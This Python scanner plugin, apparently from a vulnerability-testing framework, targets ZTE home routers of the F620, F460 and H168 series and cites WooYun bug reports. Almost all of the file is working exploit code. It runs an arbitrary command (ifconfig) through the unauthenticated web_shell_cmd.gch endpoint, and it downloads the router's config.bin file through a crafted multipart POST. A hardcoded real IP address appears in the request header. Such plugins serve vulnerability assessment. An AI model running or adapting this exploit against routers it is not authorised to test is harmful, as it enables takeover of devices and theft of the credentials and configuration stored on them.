#!/usr/bin/env python
# -*- coding: utf-8 -*-
#refer:
'''
Created on 2015-12-19
中兴f620,f420,f460,f660,zxv10 812,zxv10 815，H168等系列路由器未授权访问和命令执行
未授权访问：测试了比较关键的配置文件下载。忽略日志和版本信息
来源：
http://www.wooyun.org/bugs/wooyun-2014-066735，
http://www.wooyun.org/bugs/wooyun-2015-0104095，
http://www.wooyun.org/bugs/wooyun-2014-066732等
@author: 这个程序员不太冷
'''

import re
import urlparse

def assign(service, arg):
    if service == "zte":
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)
def audit(arg):
    postdata='IF_ACTION=apply&IF_ERRORSTR=SUCC&IF_ERRORPARAM=SUCC&IF_ERRORTYPE=-1&Cmd=ifconfig&CmdAck='
    target=arg+'web_shell_cmd.gch'
    code, head, res, errcode, _ = curl.curl2(target,post=postdata)
    if code==200 and 'encap:Ethernet' in res and 'HWaddr' in res:
        security_hole('ZTE Router Arbitrary command execution'+target)

    target1=arg+'manager_dev_config_t.gch'
    code1, head1, res1, errcode, _ = curl.curl2(target1)
    action=re.findall(r'<form name="fDownload" method="POST" action="(.+?)"',res1)
    if action:
        if len(action)>0:
            raw='''POST /%s HTTP/1.1
    Host: 221.201.251.110
    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
    Accept-Encoding: gzip, deflate
    Connection: keep-alive
    Content-Type: multipart/form-data; boundary=---------------------------2354184430652
    Content-Length: 141

    -----------------------------2354184430652
    Content-Disposition: form-data; name="defcfg"


    -----------------------------2354184430652--''' % action
            target2=arg+action
            code2, head2, res2, errcode2, _ = curl.curl2(target2,raw=raw)
            if code2==200 and 'filename=config.bin'  in head2:
                security_hole('ZTE config_file download '+target2)


    

                return arg
if __name__== '__main__':
    from dummy import *
